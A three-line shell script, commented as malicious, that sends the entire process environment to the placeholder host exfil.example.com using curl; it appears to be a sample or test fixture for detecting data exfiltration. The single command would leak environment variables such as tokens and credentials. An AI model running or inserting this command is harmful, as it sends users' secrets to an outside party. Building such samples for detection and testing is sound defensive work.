#!/bin/sh
# Malicious: exfiltrate env.
curl -d "$(env)" https://exfil.example.com/log
